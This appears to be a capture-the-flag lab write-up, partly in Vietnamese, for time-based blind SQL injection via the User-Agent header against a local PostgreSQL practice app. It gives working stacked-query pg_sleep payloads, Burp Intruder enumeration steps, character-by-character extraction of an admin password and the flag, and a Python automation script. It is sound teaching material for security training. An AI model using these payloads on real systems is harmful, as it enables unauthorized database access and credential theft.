# SQLi-034: PostgreSQL User-Agent Time-based - Writeup

## Flag: `FLAG{us3r_4g3nt_t1m3_bl1nd}`

---

## 🔍 Bước 1: DETECT

**Injection Point:** HTTP Header `User-Agent`

### Burp Suite - Repeater

1. Bật **Proxy** → **Intercept**
2. Truy cập `http://localhost:5034/` trên browser
3. **Right-click** → **Send to Repeater** (Ctrl+R)
4. Trong **Repeater**, thay đổi header:

```http
GET / HTTP/1.1
Host: localhost:5034
User-Agent: x', '0.0.0.0'); SELECT pg_sleep(5)--
```

5. Click **Send** → Kiểm tra **Response time** (góc dưới phải)
   - Normal request: ~50-200ms
   - Với payload: **~5000ms** ✅

→ **User-Agent SQLi confirmed!**

**⚠️ Context:** Ứng dụng log User-Agent vào database bằng INSERT statement:

```sql
INSERT INTO visitors (user_agent, ip_address) VALUES ('User-Agent', 'IP')
```

→ Injection point: `x', '0.0.0.0'); PAYLOAD--`

---

## 🎯 Bước 2: IDENTIFY DATABASE

### Burp Suite - Intruder

1. Trong **Repeater**, click **Action** → **Send to Intruder**
2. **Positions tab**:

```http
User-Agent: x', '0.0.0.0'); SELECT CASE WHEN (current_database()='§postgres§') THEN pg_sleep(3) END--
```

3. **Payloads tab**:

   - Payload type: **Simple list**
   - Add payloads: `postgres`, `botdb`, `test`, `mysql`

4. **Settings tab**:

   - Threads: **1** (quan trọng cho time-based!)

5. **Start attack** → Kiểm tra **Response received** time
   - `postgres`: **~3000ms** ✅
   - Các giá trị khác: ~50ms

→ Database: **postgres**

---

## 🔢 Bước 3: ENUMERATE TABLES

### 3.1. Đếm số bảng

**Intruder Positions:**

```http
User-Agent: x', '0.0.0.0'); SELECT CASE WHEN ((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='public')=§3§) THEN pg_sleep(5) END--
```

**Payloads:** `1`, `2`, `3`, `4`, `5`

→ ~5s delay với `3` → Có **3 bảng**

### 3.2. Lấy tên bảng thứ 1

**Positions:**

```http
User-Agent: x', '0.0.0.0'); SELECT CASE WHEN (SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET 0),1,1)='§a§') THEN pg_sleep(5) END--
```

**Payloads:** Brute-force charset `a-z`, `_`

**Kết quả các bảng:**

- admin_creds
- flags
- visitors

---

## 🗂️ Bước 4: ENUMERATE COLUMNS

**Positions:**

```http
User-Agent: x', '0.0.0.0'); SELECT CASE WHEN (SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='flags' LIMIT 1 OFFSET 0),1,1)='§i§') THEN pg_sleep(5) END--
```

**Payloads:** Brute-force charset `a-z`, `_`

**Kết quả columns của bảng `flags`:**

- id
- name
- value

---

## 📤 Bước 5: EXTRACT PASSWORD

**Positions:**

```http
User-Agent: x', '0.0.0.0'); SELECT CASE WHEN (SUBSTRING((SELECT password FROM admin_creds LIMIT 1 OFFSET 0),1,1)='§U§') THEN pg_sleep(5) END--
```

**Payloads:** Brute-force charset `a-z`, `A-Z`, `0-9`, `!@#_`

**Credentials:**

- ua_admin : Us3r_Ag3nt_Adm1n!

---

## 🏆 Bước 6: EXFILTRATE FLAG

**Positions:**

```http
User-Agent: x', '0.0.0.0'); SELECT CASE WHEN (SUBSTRING((SELECT value FROM flags WHERE name='sqli_034'),1,1)='§F§') THEN pg_sleep(5) END--
```

**Payloads:** Brute-force charset `a-z`, `A-Z`, `0-9`, `{}_`

**Burp Intruder Settings:**

- Attack type: **Sniper**
- Threads: **1** (quan trọng!)
- Grep Match: không cần
- Sắp xếp kết quả theo **Response received** time
- Requests có ~5000ms là ký tự đúng

🎉 **FLAG:** `FLAG{us3r_4g3nt_t1m3_bl1nd}`

---

## 🔑 User-Agent Injection Key Points

| Aspect          | Details                                                      |
| --------------- | ------------------------------------------------------------ |
| Injection Point | HTTP User-Agent header                                       |
| Detection       | Burp Repeater: `x', '0.0.0.0'); SELECT pg_sleep(5)-- `       |
| Context         | `INSERT INTO visitors (user_agent, ip_address) VALUES (...)` |
| Payload prefix  | `x', '0.0.0.0'); ` (close both VALUES parameters)            |
| Payload suffix  | `-- ` (comment out rest - note the space!)                   |

**⚠️ SQL Context Analysis:**

```sql
-- Original query
INSERT INTO visitors (user_agent, ip_address) VALUES ('USER_AGENT', 'IP_ADDRESS')

-- Injected (ĐÚNG ✅)
INSERT INTO visitors (user_agent, ip_address) VALUES ('x', '0.0.0.0'); SELECT pg_sleep(5)-- ', 'IP')
                                                       ^^^^^^^^^^^^^ Close VALUES properly

-- Injected (SAI ❌ - thiếu đóng parameter thứ 2)
INSERT INTO visitors (user_agent, ip_address) VALUES ('x'); SELECT pg_sleep(5)-- ', 'IP')
                                                           ^ Syntax error!
```

---

## 🎯 Burp Suite Workflow

### 1. Detection (Repeater)

```http
GET / HTTP/1.1
Host: localhost:5034
User-Agent: x', '0.0.0.0'); SELECT pg_sleep(5)--
```

**Check:** Response time ~5000ms = SQLi confirmed

### 2. Enumeration (Intruder)

**Template:**

```http
User-Agent: x', '0.0.0.0'); SELECT CASE WHEN (CONDITION) THEN pg_sleep(5) END--
```

**Important Settings:**

- Attack type: **Sniper**
- Threads: **1** (critical for time-based!)
- Sort by: **Response received** time
- Payloads: Custom charset based on context

### 3. Character-by-character Extraction

**Example: Extract flag position 1**

```http
User-Agent: x', '0.0.0.0'); SELECT CASE WHEN (SUBSTRING((SELECT value FROM flags),1,1)='§F§') THEN pg_sleep(5) END--
```

Payloads: `A-Z`, `a-z`, `0-9`, `{}_`

Response ~5000ms → Character found!

---

## 💡 Tips & Tricks

1. **Always include space after `--`**: `-- ` not `--`
2. **Use Repeater first** to verify payload works
3. **Intruder Threads = 1** to avoid false positives
4. **Increase timeout** in Burp Settings → Network → Timeouts
5. **Monitor Response received time**, not Response completed
6. **Test baseline** first (normal User-Agent) to know normal response time

**Other injectable HTTP headers:**

- `Referer`
- `X-Forwarded-For`
- `Cookie`
- `Authorization`
- Custom headers like `X-API-Key`

---

## 🚀 Quick Automation Script

```python
import requests
import time

def check(cond):
    start = time.time()
    ua = f"x', '0.0.0.0'); SELECT CASE WHEN ({cond}) THEN pg_sleep(2) END-- "
    requests.get("http://localhost:5034/", headers={"User-Agent": ua})
    return time.time() - start > 1.5

flag = ""
for pos in range(1, 30):
    for c in "FLAG{}_0123456789abcdefghijklmnopqrstuvwxyz":
        if check(f"(SELECT SUBSTRING(value,{pos},1) FROM flags WHERE name='sqli_034')='{c}'"):
            flag += c
            print(f"[+] {flag}")
            break
```

🎉 **FLAG:** `FLAG{us3r_4g3nt_t1m3_bl1nd}`
